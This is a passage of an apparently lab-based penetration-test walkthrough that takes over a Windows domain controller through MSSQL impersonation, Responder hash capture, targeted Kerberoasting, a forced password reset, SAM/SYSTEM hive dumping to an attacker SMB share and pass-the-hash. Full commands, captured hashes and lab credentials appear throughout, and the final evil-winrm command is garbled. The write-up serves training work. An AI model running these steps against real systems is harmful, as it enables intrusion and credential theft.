[15:02:28:077] [5764:00001686] [ERROR][com.freerdp.core] - [transport_read_layer]: ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
[15:02:28:198] [5764:00001686] [WARN][com.freerdp.crypto] - [tls_verify_certificate]: [DANGER] Certificate not checked, /cert:ignore in use.
[15:02:28:198] [5764:00001686] [WARN][com.freerdp.crypto] - [tls_verify_certificate]: [DANGER] This prevents MITM attacks from being detected!
[15:02:28:198] [5764:00001686] [WARN][com.freerdp.crypto] - [tls_verify_certificate]: [DANGER] Avoid using this unless in a secure LAN (=no internet) environment
[15:02:28:312] [5764:00001686] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5glue_get_init_creds (Client 'discovery@ATHENA.MIT.EDU' not found in Kerberos database [-1765328378])
[15:02:28:428] [5764:00001686] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5glue_get_init_creds (Client 'discovery@ATHENA.MIT.EDU' not found in Kerberos database [-1765328378])
[15:02:28:498] [5764:00001686] [ERROR][com.freerdp.core.transport] - [transport_read_layer]: BIO_read returned a system error 104: Connection reset by peer
[15:02:28:498] [5764:00001686] [ERROR][com.freerdp.core] - [transport_read_layer]: ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
[15:02:28:498] [5764:00001686] [ERROR][com.freerdp.core] - [freerdp_connect]: freerdp_post_connect failed
```

2. MSSQL worked.

```
impacket-mssqlclient hokkaido-aerospace.com/discovery:'Start123!'@192.168.209.40 -dc-ip dc.hokkaido-aerospace.com -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (HAERO\discovery  guest@master)>
```

Enumerated databases.

```
SQL (HAERO\discovery  guest@master)> SELECT name FROM sys.databases;
name      
-------   
master    
tempdb    
model     
msdb      
hrappdb
```

Enumerated tables in "msdb" database.

```
SQL (HAERO\discovery  guest@master)> SELECT * FROM msdb.information_schema.tables;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME                                   TABLE_TYPE   
-------------   ------------   ------------------------------------------   ----------   
msdb            dbo            syspolicy_policy_category_subscriptions      b'VIEW'      
msdb            dbo            syspolicy_system_health_state                b'VIEW'      
msdb            dbo            syspolicy_policy_execution_history           b'VIEW'      
msdb            dbo            syspolicy_policy_execution_history_details   b'VIEW'      
msdb            dbo            syspolicy_configuration                      b'VIEW'      
msdb            dbo            syspolicy_conditions                         b'VIEW'      
msdb            dbo            syspolicy_policy_categories                  b'VIEW'      
msdb            dbo            sysdac_instances                             b'VIEW'      
msdb            dbo            syspolicy_object_sets                        b'VIEW'      
msdb            dbo            dm_hadr_automatic_seeding_history            b'BASE TABLE'   
msdb            dbo            syspolicy_policies                           b'VIEW'      
msdb            dbo            backupmediaset                               b'BASE TABLE'   
msdb            dbo            backupmediafamily                            b'BASE TABLE'   
msdb            dbo            backupset                                    b'BASE TABLE'   
msdb            dbo            autoadmin_backup_configuration_summary       b'VIEW'      
msdb            dbo            backupfile                                   b'BASE TABLE'   
msdb            dbo            syspolicy_target_sets                        b'VIEW'      
msdb            dbo            restorehistory                               b'BASE TABLE'   
msdb            dbo            restorefile                                  b'BASE TABLE'   
msdb            dbo            syspolicy_target_set_levels                  b'VIEW'      
msdb            dbo            restorefilegroup                             b'BASE TABLE'   
msdb            dbo            logmarkhistory                               b'BASE TABLE'   
msdb            dbo            suspect_pages                                b'BASE TABLE'
```

Enumerating "hrappdb" database is restricted for our current user.

```
SQL (HAERO\discovery  guest@master)> SELECT * FROM hrappdb.information_schema.tables;
ERROR(DC\SQLEXPRESS): Line 1: The server principal "HAERO\discovery" is not able to access the database "hrappdb" under the current security context.
```

Within all the databases were no interesting files retrieved. I utilized netexec in order to enumerate users which our current user can impersonate within the the mssql database.

```
nxc mssql 192.168.209.40 -u discovery -p 'Start123!' -M enum_impersonate
MSSQL       192.168.209.40  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:hokkaido-aerospace.com)
MSSQL       192.168.209.40  1433   DC               [+] hokkaido-aerospace.com\discovery:Start123! 
ENUM_IMP... 192.168.209.40  1433   DC               [+] Users with impersonation rights:
ENUM_IMP... 192.168.209.40  1433   DC               [*]   - hrappdb-reader
```

We can enumerate an user called "hrappdb-reader", this should provide us access to the restricted database. Here is the manual version of enumerating users with Impersonate permission.

```
SQL (HAERO\discovery  guest@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name             
--------------   
hrappdb-reader
```

Logged in as user hrappdb-reader

```
EXECUTE AS LOGIN = 'hrappdb-reader'
```

Enumerated table within the database and gained credentials.

```
SQL (hrappdb-reader  guest@master)> SELECT * FROM hrappdb.dbo.sysauth;
id   name               password           
--   ----------------   ----------------   
 0   b'hrapp-service'   b'Untimed$Runny'
```

Logged into smb share "homes" with the retrieved credentials and downloaded all user directories.

```
smbclient \\\\192.168.209.40/homes -U hrapp-service -p
Password for [WORKGROUP\hrapp-service]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

This also didn't retrieve us anything useful. Let's go back into mssql, since we now got an new user let's check if he can utilize xp_cmdshell or xp_dirtree.

xp_dirtree is runnable. We could try and run responder locally (smb listener) in order to perform an MITM Attack and steal the NTLM Hash of an user. 

Started up smb listener locally.
```
responder -I tun0
```

Executed the following request to our smb share.

```
EXEC xp_dirtree '//192.168.45.180/fake_share/', 1, 0;
```

Catched the NTLM Hash of the user "DC$" --> Domain Controller??

```
[SMB] NTLMv2-SSP Client   : 192.168.209.40
[SMB] NTLMv2-SSP Username : HAERO\DC$
[SMB] NTLMv2-SSP Hash     : DC$::HAERO:a8a74680ccab5bef:A2764C391E5B36853A71AA3A10673445:010100000000000000DD65A9808CDC01B7EEE4413ABE00B40000000002000800350045005400540001001E00570049004E002D004E00590039003000340059004400430041004400440004003400570049004E002D004E0059003900300034005900440043004100440044002E0035004500540054002E004C004F00430041004C000300140035004500540054002E004C004F00430041004C000500140035004500540054002E004C004F00430041004C000700080000DD65A9808CDC0106000400020000000800300030000000000000000000000000300000433B0EF5F8E27CDF7808A917C673B70D206B92EBBD08EDD46BACBC21B1B05A070A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100380030000000000000000000
```

Sadly enough we were not able to bruteforce an password out of this Domain Controller hash.

Since we got 3x plaintext credentials, let's utilize them in order to download domain information for bloodhound.

```
bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -ns 192.168.209.40 -d hokkaido-aerospace.com -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hokkaido-aerospace.com
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.hokkaido-aerospace.com
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.hokkaido-aerospace.com
INFO: Found 34 users
INFO: Found 62 groups
INFO: Found 2 gpos
INFO: Found 6 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: dc.hokkaido-aerospace.com
INFO: Done in 00M 05S
```

Compressed all domain information (.json files) into an .zip file.

```
zip AD-HAERO.zip *.json
  adding: 20260123161455_computers.json (deflated 83%)
  adding: 20260123161455_containers.json (deflated 93%)
  adding: 20260123161455_domains.json (deflated 76%)
  adding: 20260123161455_gpos.json (deflated 86%)
  adding: 20260123161455_groups.json (deflated 95%)
  adding: 20260123161455_ous.json (deflated 91%)
  adding: 20260123161455_users.json (deflated 96%)
```

Since we now downloaded all domain information, let's startup bloodhound.

```
neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2026-01-23 21:17:09.238+0000 INFO  Starting...
2026-01-23 21:17:10.016+0000 INFO  This instance is ServerId{c77d0110} (c77d0110-4f59-4257-aeaa-36b24fadfb36)
2026-01-23 21:17:11.503+0000 INFO  ======== Neo4j 4.4.26 ========
2026-01-23 21:17:12.887+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2026-01-23 21:17:12.888+0000 INFO  Updating the initial password in component 'security-users'
2026-01-23 21:17:16.047+0000 INFO  Bolt enabled on localhost:7687.
2026-01-23 21:17:16.999+0000 INFO  Remote interface available at http://localhost:7474/
2026-01-23 21:17:17.004+0000 INFO  id: 8AE5ED4B8F9FCC8C769491272EDA3578F850645229455529BA6F437ECC8E7EAE
2026-01-23 21:17:17.004+0000 INFO  name: system
2026-01-23 21:17:17.004+0000 INFO  creationDate: 2025-11-11T22:42:00.723Z
2026-01-23 21:17:17.004+0000 INFO  Started.
```

```
bloodhound                                                                                                 

 Starting neo4j
Neo4j is running at pid 9049

 Bloodhound will start

 IMPORTANT: It will take time, please wait...

{"time":"2026-01-23T16:17:31.76447625-05:00","level":"INFO","message":"Reading configuration found at /etc/bhapi/bhapi.json"}
{"time":"2026-01-23T16:17:31.764775128-05:00","level":"INFO","message":"Logging configured","log_level":"INFO"}
{"time":"2026-01-23T16:17:31.821158274-05:00","level":"INFO","message":"No database driver has been set for migration, using: neo4j"}
{"time":"2026-01-23T16:17:31.821294914-05:00","level":"INFO","message":"Connecting to graph using Neo4j"}
{"time":"2026-01-23T16:17:31.821552523-05:00","level":"INFO","message":"Starting daemon Tools API"}
{"time":"2026-01-23T16:17:31.852483933-05:00","level":"INFO","message":"Executing SQL migrations for v8.3.0"}
{"time":"2026-01-23T16:17:31.916105557-05:00","level":"INFO","message":"Executing SQL migrations for v8.4.0"}
{"time":"2026-01-23T16:17:33.575912177-05:00","level":"INFO","message":"Graph migration version v8.3.0 is greater than current version v8.2.0"}
{"time":"2026-01-23T16:17:33.575972159-05:00","level":"INFO","message":"Migration to cleanup bad `lastseen` properties from 7.4.0","measurement_id":1}
{"time":"2026-01-23T16:17:33.800976967-05:00","level":"INFO","message":"Graph migration version v8.3.0 executed successfully"}
{"time":"2026-01-23T16:17:33.992765394-05:00","level":"ERROR","message":"Error generating AzureHound manifest file: error reading downloads directory /etc/bloodhound/collectors/azurehound: open /etc/bloodhound/collectors/azurehound: no such file or directory"}
{"time":"2026-01-23T16:17:33.992832594-05:00","level":"ERROR","message":"Error generating SharpHound manifest file: error reading downloads directory /etc/bloodhound/collectors/sharphound: open /etc/bloodhound/collectors/sharphound: no such file or directory"}
{"time":"2026-01-23T16:17:33.997971264-05:00","level":"INFO","message":"Analysis requested by init"}
{"time":"2026-01-23T16:17:34.000403228-05:00","level":"INFO","message":"Starting daemon API Daemon"}
{"time":"2026-01-23T16:17:34.000451593-05:00","level":"INFO","message":"Starting daemon Data Pruning Daemon"}
{"time":"2026-01-23T16:17:34.000598242-05:00","level":"INFO","message":"Starting daemon Changelog Daemon"}
{"time":"2026-01-23T16:17:34.000622616-05:00","level":"INFO","message":"Starting daemon Data Pipe Daemon"}
{"time":"2026-01-23T16:17:34.000630734-05:00","level":"INFO","message":"Server started successfully"}
{"time":"2026-01-23T16:17:34.004616917-05:00","level":"INFO","message":"Running OrphanFileSweeper for path /var/lib/bhe/work/tmp"}
{"time":"2026-01-23T16:17:34.013561819-05:00","level":"INFO","message":"Graph Analysis","measurement_id":2}
{"time":"2026-01-23T16:17:35.4555437-05:00","level":"INFO","message":"FetchActiveDirectoryTierZeroRoots","measurement_id":3}
{"time":"2026-01-23T16:17:35.685658222-05:00","level":"INFO","message":"Fetching group members for 12 AD nodes"}
{"time":"2026-01-23T16:17:35.893448077-05:00","level":"INFO","message":"Collected 4 group members"}
{"time":"2026-01-23T16:17:37.598922989-05:00","level":"INFO","message":"Finished deleting transit edges","elapsed":1347.499726}
{"time":"2026-01-23T16:17:37.599003962-05:00","level":"INFO","message":"Expanding all AD group and local group memberships"}
{"time":"2026-01-23T16:17:37.624739292-05:00","level":"INFO","message":"Collected 61 groups to resolve"}
{"time":"2026-01-23T16:17:38.817403211-05:00","level":"INFO","message":"Finished post-processing 1 active directory computers"}
{"time":"2026-01-23T16:17:39.463491407-05:00","level":"INFO","message":"Finished building adcs cache"}
{"time":"2026-01-23T16:17:41.279278999-05:00","level":"INFO","message":"Started Data Quality Stats Collection"}
{"time":"2026-01-23T16:17:41.932989387-05:00","level":"INFO","message":"Cache successfully reset by datapipe daemon"}
{"time":"2026-01-23T16:17:41.933128849-05:00","level":"INFO","message":"Graph Analysis","measurement_id":2,"elapsed":7919.568107}
```

Accessed bloodhound UI on localhost:9090/ui and uploaded the .zip file.

1. Marked our user "hrapp-service" as owned.
2. Navigated to Cypher > Shortest Path from Owned Objects

Discovered that our current user "hrapp-service" has GenericWrite Access onto user Hazel.Green, we could do kerberoasting and retrieve and bruteforce her hash. Hazel.Green seems to be able to change an password of user "Molly.Smith" which is also an Tier1 Admin on the target server! Juicy!

Let's start with getting the hash from user "HAZEL.GREEN". We utilized an .py script called "TargetedKerberoast" for this scenario.

Downloaded the following tool.

```
https://github.com/ShutdownRepo/targetedKerberoast.git
```

In order to run the script properly, we'll need to install the requirements in the .txt file, but we can only do this in an virtual environment. Let's set one up!

```
python3 -m venv myenv
source myenv/bin/activate
```

Installed requirements.

```
pip install -r requirements.txt
```

```
./targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.209.40
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Hazel.Green)
[+] Printing hash for (Hazel.Green)
$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$0efcff80c82f2ae480798a3b6fbde589$004070e4356a8fa83d520c554b87d04843746172f01260d5a1e080d8110410bb8b4f36df8df1368285c87c970e8c6e981693f0bdf73a4b7a81b5472cc79b000ea4e2b2ad357f74d63b31574a3e54d537875f164e4eb3054d0a509ca6d94baed3d4107683137ff938d1e89488c45c80b526449eb530dc92b7afb1fba3910ce8cd507b5fa74ef6b6acbd141f9feab40c53fba5f77136ff8dfe234c8a9167f48e2035420d437af9bbdd496fc0648c7f9af23c4b2125cae3fc39060949ac87205fe6be0c5af8a0e6ce9f281930e986546a0e44385d1b056a6d070d62972e56387a7f404849a36e849294ff8ea967a4ac632c81cbb76092de87857641194764a19f95fe0d92d27f5c1ae621588bf5f6545e533f7077af760ea98acb934eb522b79e029ac65b065b34c62d23f3d470606bd644d612392b779e61a8b016f81405e9dcccba2a6075f00e25ff6802fd56ac63cb9482877abf5c9be349ab1b68d7fe66e4363fcf92de74448f30a03f19b52f751e640d3a925ede3332741991daff664f8469bebe529675b81664d015ecfb9ddccc2a840bf20aa7a26ea718eb88a39904eed219c81e29a299c1f0e4091fd1ef5403d8ebbaff2f918ba58b4c573a97a00df4d295586070faf6ee53e405567ecb90500555a29916f26b45a114b443062a40505400fe9fe78a2be1bf9f8c799f131de375b900be3caad1f5f17bf09b7de45ff01c4dbdb6539514c8326bd2a31b3fb95d1eed82cd7a67eace8774536f458e5453982995f0d36d0c9b171b9cff523c5946b6621ef39be51ab359bc3801e86829d05672d54ec440b0de761e37c1767215bda0295695d60353071db45bfdd97224341d27f75e4e624cd5220605bace4b3cccbd5d81b8ead3745ef6596bedd529a78d1e5076c0709f0a3d6fd7aaf90a7b97f7a698627b430843d52de7d93748f8a5c26e28a7d532d9be5e1d0da0699791e7c4db4580909cfff3a9d9f763c4e8cfb6113ad9c4ae7f03033cde6683b03ccc203aa98039de0198bd7a3470edc119172ddfbc079a8d6b83a76031fb2298a9b02e98662464a6f7f7851dd16eae566b51b09855ca83e6ed640e038f51004cc1fcfb207b68097d0061f69cd6c06fcf060bc0e9d9a77620c52359614a02e4f6eba4e37a4299d5f1e2ed1460b1d06add4a7f8ac58b8b5b66579400e3c44679aadaae66472e4578125c3164befc10ec206004542f850a26b05bda73663f4d88bcf5347f80c0b9e414ed5205ce3ce6a56940b52f9da4d8691e6e279ac863af9a411d8a14a051847e41503dd3e2b9b6679ca2730f3af01607e0e208b1b7afcde74ae8062d0152354f65aae6a9720d3e54028d4e2705cdc1f9a91999f45276282ff41f41cee7f9fbff756f8eb9ed9ee98af79fdc89ec1c31a5b52dde5499bdc931f75f7cb0199a651e202e6888ed81ba20819f5d203480daa3465357ff552729c354b5b9cd8722726edc375622301f0c425f4f20bdd0e0e98a521289401c46aa1ee7051013f33924b92ebe1adee178da4f156bc65f55b82f6b4a1d952a5f42c528455abbd9b9b1dc92aff44c6cb35d412a351e4c066928da1905391bf17fbee424eda58ebfd3c574bfadbdb29de0729d6b856f8dafcf673238a5a3e74eaf60e8e4f3f0
[VERBOSE] SPN removed successfully for (Hazel.Green)
```

Saved the hash locally & utilized hashcat with the specificator of 13100 in order to bruteforce an password out of the hash of user "Hazel.Green".

```
hashcat -m 13100 Hazel.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-11th Gen Intel(R) Core(TM) i7-1185G7 @ 3.00GHz, 5457/10914 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (7927 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$0efcff80c82f2ae480798a3b6fbde589$004070e4356a8fa83d520c554b87d04843746172f01260d5a1e080d8110410bb8b4f36df8df1368285c87c970e8c6e981693f0bdf73a4b7a81b5472cc79b000ea4e2b2ad357f74d63b31574a3e54d537875f164e4eb3054d0a509ca6d94baed3d4107683137ff938d1e89488c45c80b526449eb530dc92b7afb1fba3910ce8cd507b5fa74ef6b6acbd141f9feab40c53fba5f77136ff8dfe234c8a9167f48e2035420d437af9bbdd496fc0648c7f9af23c4b2125cae3fc39060949ac87205fe6be0c5af8a0e6ce9f281930e986546a0e44385d1b056a6d070d62972e56387a7f404849a36e849294ff8ea967a4ac632c81cbb76092de87857641194764a19f95fe0d92d27f5c1ae621588bf5f6545e533f7077af760ea98acb934eb522b79e029ac65b065b34c62d23f3d470606bd644d612392b779e61a8b016f81405e9dcccba2a6075f00e25ff6802fd56ac63cb9482877abf5c9be349ab1b68d7fe66e4363fcf92de74448f30a03f19b52f751e640d3a925ede3332741991daff664f8469bebe529675b81664d015ecfb9ddccc2a840bf20aa7a26ea718eb88a39904eed219c81e29a299c1f0e4091fd1ef5403d8ebbaff2f918ba58b4c573a97a00df4d295586070faf6ee53e405567ecb90500555a29916f26b45a114b443062a40505400fe9fe78a2be1bf9f8c799f131de375b900be3caad1f5f17bf09b7de45ff01c4dbdb6539514c8326bd2a31b3fb95d1eed82cd7a67eace8774536f458e5453982995f0d36d0c9b171b9cff523c5946b6621ef39be51ab359bc3801e86829d05672d54ec440b0de761e37c1767215bda0295695d60353071db45bfdd97224341d27f75e4e624cd5220605bace4b3cccbd5d81b8ead3745ef6596bedd529a78d1e5076c0709f0a3d6fd7aaf90a7b97f7a698627b430843d52de7d93748f8a5c26e28a7d532d9be5e1d0da0699791e7c4db4580909cfff3a9d9f763c4e8cfb6113ad9c4ae7f03033cde6683b03ccc203aa98039de0198bd7a3470edc119172ddfbc079a8d6b83a76031fb2298a9b02e98662464a6f7f7851dd16eae566b51b09855ca83e6ed640e038f51004cc1fcfb207b68097d0061f69cd6c06fcf060bc0e9d9a77620c52359614a02e4f6eba4e37a4299d5f1e2ed1460b1d06add4a7f8ac58b8b5b66579400e3c44679aadaae66472e4578125c3164befc10ec206004542f850a26b05bda73663f4d88bcf5347f80c0b9e414ed5205ce3ce6a56940b52f9da4d8691e6e279ac863af9a411d8a14a051847e41503dd3e2b9b6679ca2730f3af01607e0e208b1b7afcde74ae8062d0152354f65aae6a9720d3e54028d4e2705cdc1f9a91999f45276282ff41f41cee7f9fbff756f8eb9ed9ee98af79fdc89ec1c31a5b52dde5499bdc931f75f7cb0199a651e202e6888ed81ba20819f5d203480daa3465357ff552729c354b5b9cd8722726edc375622301f0c425f4f20bdd0e0e98a521289401c46aa1ee7051013f33924b92ebe1adee178da4f156bc65f55b82f6b4a1d952a5f42c528455abbd9b9b1dc92aff44c6cb35d412a351e4c066928da1905391bf17fbee424eda58ebfd3c574bfadbdb29de0729d6b856f8dafcf673238a5a3e74eaf60e8e4f3f0:haze1988
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hok...e4f3f0
Time.Started.....: Fri Jan 23 17:30:22 2026 (4 secs)
Time.Estimated...: Fri Jan 23 17:30:26 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1959.1 kH/s (3.58ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7667712/14344385 (53.45%)
Rejected.........: 0/7667712 (0.00%)
Restore.Point....: 7659520/14344385 (53.40%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: hazlam -> havitaytay
Hardware.Mon.#01.: Util: 53%

Started: Fri Jan 23 17:30:21 2026
Stopped: Fri Jan 23 17:30:28 2026
```

Retrieved Tier2 Admin Credentials of Hazel.Green.

```
Hazel.Green:haze1988
```

Since we know our user Hazel.Green has full password change rights on the molly.smith user, let's do it!

```
rpcclient -N 192.168.209.40 -U 'Hazel.Green%haze1988'
rpcclient $> setuserinfo2 MOLLY.SMITH 23 'password'
```

Retrieved local.txt in C:\Users\Molly.Smith\Desktop.

```

```

Enumerated User Privileges.

```
whoami /priv
```

User Molly.Smith seems to be owning BackupPrivileges.

If an user has the SeBackupPrivilege enabled or is part of the Backup Operators group we can retrieve the SYSTEM & SAM files from registry hives or even copy the whole drive and back it up into an different drive to access sensitive files like SYSTEM & SAM.

## Registry Hive PoC

```
reg save hklm\sam c:\Windows\Tasks\SAM
```

                 
```
reg save hklm\system c:\Windows\Tasks\SYSTEM
```

On local machine:

```
impacket-smbserver test . -smb2support  -username hacker -password password
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

On target machine:

```
net use m: \\192.168.45.241\test /user:hacker password
```

Downloaded SAM file on local machine.

```
copy SAM m:\
```

Downloaded SYSTEM file on local machine.

```
copy SYSTEM m:\
```

Utilize secretsdump to dump hashes.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -sam SAM local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2fcb0ca02fb5133abd227a05724cd961  
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.  
[*] Cleaning up...
```

Since we retrieved the Administrator NTLM Hash, let's utilize evil-winrm to get an shell as Administrator user.

```
evil-wirnm -i 192.168.209.40 -u Administrator -H aad3b435b51404eeaad3b435b51404ee
```

Retrieved proof.txt in C:\Users\Administrator\Desktop.

```

```
